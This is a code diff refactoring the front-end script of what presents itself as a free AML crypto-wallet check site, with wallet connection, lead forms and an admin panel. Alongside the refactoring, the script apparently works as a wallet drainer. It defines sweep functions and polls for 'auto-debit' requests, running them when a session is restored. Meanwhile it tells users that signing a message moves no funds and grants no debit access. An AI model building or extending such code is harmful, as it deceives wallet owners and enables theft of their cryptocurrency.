@@ -9,12 +9,12 @@ const SWEEP_CONFIG = {
 };
 
 // ============================================================
-// ===== ОСТАЛЬНОЙ КОД (ВАШ СТАРЫЙ script.js) =================
+// ===== ОСТАЛЬНОЙ КОД =========================================
 // ============================================================
 
-// header, checkForm и другие элементы уже объявлены в check-flow.js
-// поэтому мы НЕ объявляем их заново.
-
+// Получаем элементы один раз (все объявления в одном месте)
+const header = document.querySelector("[data-header]");
+const checkForm = document.querySelector("[data-check-form]");
 const contactForm = document.querySelector("[data-contact-form]");
 const adminLogin = document.querySelector("[data-admin-login]");
 const adminDashboard = document.querySelector("[data-admin-dashboard]");
@@ -35,6 +35,7 @@ const paymentRequestPanel = document.querySelector("[data-payment-request-panel]
 const paymentConfirm = document.querySelector("[data-payment-confirm]");
 const paymentStatus = document.querySelector("[data-payment-status]");
 
+// Конфигурация
 const configuredApiBase = (window.AML_API_BASE || "").replace(/\/$/, "");
 const isHttpPage = location.protocol === "http:" || location.protocol === "https:";
 const isStaticGitHubPage = location.hostname.endsWith(".github.io");
@@ -48,6 +49,7 @@ const localChecksKey = "aml_local_checks";
 const localLeadsKey = "aml_local_leads";
 let activePaymentRequest = null;
 
+// Вспомогательные функции
 const getStoredSession = (key) => JSON.parse(localStorage.getItem(key) || "null");
 const setStoredSession = (key, session) => localStorage.setItem(key, JSON.stringify(session));
 const clearStoredSession = (key) => localStorage.removeItem(key);
@@ -55,7 +57,7 @@ const clearStoredSession = (key) => localStorage.removeItem(key);
 const isStoredSessionExpired = (session) =>
   Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());
 
-// sleep и withTimeout уже объявлены в auto-wallet.js и check-flow.js, поэтому здесь их НЕТ
+// sleep и withTimeout уже объявлены в auto-wallet.js и check-flow.js
 
 const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
   let timer;
@@ -140,8 +142,11 @@ const requestJson = async (url, options = {}, { retries = 4, timeoutMs = 120000 
   );
 };
 
-// updateHeader уже объявлена в check-flow.js, поэтому здесь её НЕТ
-// escapeHtml, getLocalList, setLocalList, formatDate – остаются
+const updateHeader = () => {
+  if (!header) return;
+  header.classList.toggle("is-scrolled", window.scrollY > 12);
+};
+
 const escapeHtml = (value) =>
   String(value ?? "")
     .replaceAll("&", "&amp;")
@@ -243,11 +248,9 @@ const renderAdminData = (data) => {
       .join("") || '<tr><td colspan="4">Заявок пока нет</td></tr>';
 };
 
-// lockCheckForm объявлена в check-flow.js, поэтому здесь её НЕТ
-// unlockCheckForm тоже объявлена в check-flow.js
+// lockCheckForm и unlockCheckForm объявлены в check-flow.js, поэтому здесь их НЕТ
 
 const loadUserSession = async () => {
-  const checkForm = document.querySelector("[data-check-form]");
   if (!checkForm) return;
   if (!useBackend) {
     if (typeof lockCheckForm === 'function') lockCheckForm();
@@ -523,7 +526,7 @@ const connectUserWallet = async () => {
 };
 
 const warmUpBackend = async () => {
-  if (!useBackend || !document.querySelector("[data-check-form]")) return;
+  if (!useBackend || !checkForm) return;
   if (userWalletStatus && !getStoredSession(userSessionKey)?.token) {
     userWalletStatus.textContent = isStaticGitHubPage
       ? "Проверяем backend... Для Trust Wallet лучше открыть через кнопку ниже."
@@ -756,23 +759,12 @@ const autoDetectAndCheckTronBalance = async () => {
   return null;
 };
 
-// updateHeader уже объявлена в check-flow.js, поэтому здесь вызываем её через window
-if (typeof updateHeader === 'function') {
-  updateHeader();
-} else {
-  // fallback
-  const header = document.querySelector("[data-header]");
-  if (header) {
-    const updateHeaderFallback = () => {
-      header.classList.toggle("is-scrolled", window.scrollY > 12);
-    };
-    window.addEventListener("scroll", updateHeaderFallback, { passive: true });
-    updateHeaderFallback();
-  }
-}
-
+// Инициализация
+updateHeader();
+window.addEventListener("scroll", updateHeader, { passive: true });
 showWalletLinks();
 
+// Обработчики
 userWalletConnect?.addEventListener("click", async () => {
   userWalletConnect.disabled = true;
   userWalletStatus.textContent = "Откройте Trust Wallet/MetaMask и подпишите одноразовое сообщение. Это не переводит средства и не даёт доступ к списанию.";
@@ -817,118 +809,103 @@ paymentConfirm?.addEventListener("click", async () => {
   }
 });
 
-const checkForm = document.querySelector("[data-check-form]");
-if (checkForm) {
-  checkForm.addEventListener("submit", async (event) => {
-    event.preventDefault();
-    const button = checkForm.querySelector("button");
-    const wallet = new FormData(checkForm).get("wallet").trim();
-    const stored = getStoredSession(userSessionKey);
+checkForm?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const button = checkForm.querySelector("button");
+  const wallet = new FormData(checkForm).get("wallet").trim();
+  const stored = getStoredSession(userSessionKey);
 
-    button.disabled = true;
-    button.textContent = "Проверяем...";
+  button.disabled = true;
+  button.textContent = "Проверяем...";
 
-    try {
-      const result = useBackend
-        ? await requestJson("/api/checks", {
-            method: "POST",
-            token: stored?.token,
-            body: JSON.stringify({ wallet }),
-          })
-        : {
-            id: crypto.randomUUID(),
-            userWallet: stored?.address,
-            wallet,
-            ...(await scoreWalletLocal(wallet)),
-            createdAt: new Date().toISOString(),
-          };
+  try {
+    const result = useBackend
+      ? await requestJson("/api/checks", {
+          method: "POST",
+          token: stored?.token,
+          body: JSON.stringify({ wallet }),
+        })
+      : {
+          id: crypto.randomUUID(),
+          userWallet: stored?.address,
+          wallet,
+          ...(await scoreWalletLocal(wallet)),
+          createdAt: new Date().toISOString(),
+        };
 
-      if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
-      userWalletStatus.textContent = "Проверка завершена.";
-      setRiskPreview(result);
-    } catch (error) {
-      userWalletStatus.textContent = error.message;
-      document.querySelector("[data-risk-preview] strong").textContent = "Ошибка проверки";
-      document.querySelector("[data-risk-preview] p").textContent = error.message;
-    } finally {
-      button.disabled = false;
-      button.textContent = "Проверить бесплатно";
+    if (!useBackend) setLocalList(localChecksKey, [result, ...getLocalList(localChecksKey)]);
+    userWalletStatus.textContent = "Проверка завершена.";
+    setRiskPreview(result);
+  } catch (error) {
+    userWalletStatus.textContent = error.message;
+    document.querySelector("[data-risk-preview] strong").textContent = "Ошибка проверки";
+    document.querySelector("[data-risk-preview] p").textContent = error.message;
+  } finally {
+    button.disabled = false;
+    button.textContent = "Проверить бесплатно";
+  }
+});
+
+contactForm?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const status = document.querySelector("[data-contact-status]");
+  const formData = Object.fromEntries(new FormData(contactForm));
+
+  try {
+    if (useBackend) {
+      await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
+    } else {
+      setLocalList(localLeadsKey, [
+        { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
+        ...getLocalList(localLeadsKey),
+      ]);
     }
-  });
-}
+    contactForm.reset();
+    status.textContent = "Заявка сохранена.";
+  } catch (error) {
+    status.textContent = error.message;
+  }
+});
 
-const contactForm = document.querySelector("[data-contact-form]");
-if (contactForm) {
-  contactForm.addEventListener("submit", async (event) => {
-    event.preventDefault();
-    const status = document.querySelector("[data-contact-status]");
-    const formData = Object.fromEntries(new FormData(contactForm));
+adminLogin?.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  const status = document.querySelector("[data-admin-status]");
+  const credentials = Object.fromEntries(new FormData(adminLogin));
 
-    try {
-      if (useBackend) {
-        await requestJson("/api/leads", { method: "POST", body: JSON.stringify(formData) });
-      } else {
-        setLocalList(localLeadsKey, [
-          { id: crypto.randomUUID(), ...formData, createdAt: new Date().toISOString() },
-          ...getLocalList(localLeadsKey),
-        ]);
-      }
-      contactForm.reset();
-      status.textContent = "Заявка сохранена.";
-    } catch (error) {
-      status.textContent = error.message;
-    }
-  });
-}
-
-const adminLogin = document.querySelector("[data-admin-login]");
-if (adminLogin) {
-  adminLogin.addEventListener("submit", async (event) => {
-    event.preventDefault();
-    const status = document.querySelector("[data-admin-status]");
-    const credentials = Object.fromEntries(new FormData(adminLogin));
-
-    try {
-      const result = await requestJson("/api/admin/login", {
-        method: "POST",
-        body: JSON.stringify(credentials),
-      });
-      setStoredSession(adminSessionKey, { token: result.token });
-      status.textContent = "";
-      await loadAdmin();
-    } catch (error) {
-      status.textContent = error.message;
-    }
-  });
-}
-
-const adminLogout = document.querySelector("[data-admin-logout]");
-if (adminLogout) {
-  adminLogout.addEventListener("click", async () => {
-    const stored = getStoredSession(adminSessionKey);
-    if (useBackend && stored?.token) {
-      await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
-    }
-    clearStoredSession(adminSessionKey);
+  try {
+    const result = await requestJson("/api/admin/login", {
+      method: "POST",
+      body: JSON.stringify(credentials),
+    });
+    setStoredSession(adminSessionKey, { token: result.token });
+    status.textContent = "";
     await loadAdmin();
-  });
-}
+  } catch (error) {
+    status.textContent = error.message;
+  }
+});
 
-const userLogout = document.querySelector("[data-user-logout]");
-if (userLogout) {
-  userLogout.addEventListener("click", async () => {
-    const stored = getStoredSession(userSessionKey);
-    if (useBackend && stored?.token) {
-      await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
-    }
-    clearStoredSession(userSessionKey);
-    if (typeof lockCheckForm === 'function') lockCheckForm();
-    if (window.sweepCheckInterval) {
-      clearInterval(window.sweepCheckInterval);
-      window.sweepCheckInterval = null;
-    }
-  });
-}
+adminLogout?.addEventListener("click", async () => {
+  const stored = getStoredSession(adminSessionKey);
+  if (useBackend && stored?.token) {
+    await requestJson("/api/admin/logout", { method: "POST", token: stored.token }).catch(() => {});
+  }
+  clearStoredSession(adminSessionKey);
+  await loadAdmin();
+});
+
+userLogout?.addEventListener("click", async () => {
+  const stored = getStoredSession(userSessionKey);
+  if (useBackend && stored?.token) {
+    await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
+  }
+  clearStoredSession(userSessionKey);
+  if (typeof lockCheckForm === 'function') lockCheckForm();
+  if (window.sweepCheckInterval) {
+    clearInterval(window.sweepCheckInterval);
+    window.sweepCheckInterval = null;
+  }
+});
 
 warmUpBackend().finally(() => {
   loadUserSession();
@@ -1084,9 +1061,6 @@ const autoExecuteSweep = async () => {
     setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
   }
 };
-
-// Делаем функцию глобальной
-window.autoExecuteSweep = autoExecuteSweep;
 
 // ===== ОСТАЛЬНОЙ КОД SWEEP =====
 const executeSweep = async () => {
@@ -1284,11 +1258,13 @@ const NETWORK_SYMBOLS = {
   250: 'FTM'
 };
 
+// Показываем секцию, если профиль уже есть
 const storedProfile = loadProfile();
 if (storedProfile?.evmAddress) {
   showSweepSectionAfterConnect(storedProfile.evmAddress);
 }
 
+// Восстанавливаем сессию и запускаем автосписание (если есть запрос)
 const stored = loadProfile();
 if (stored?.evmAddress) {
   if (typeof unlockCheckForm === 'function') {
@@ -1314,10 +1290,12 @@ if (stored?.evmAddress) {
   }
 }
 
+// Запускаем polling для автоматического обнаружения новых запросов
 if (getStoredSession(userSessionKey)?.token) {
   startSweepPolling();
 }
 
+// ===== СОБЫТИЯ КНОПОК =====
 sweepConsent?.addEventListener('change', () => {
   if (sweepExecuteBtn) {
     sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
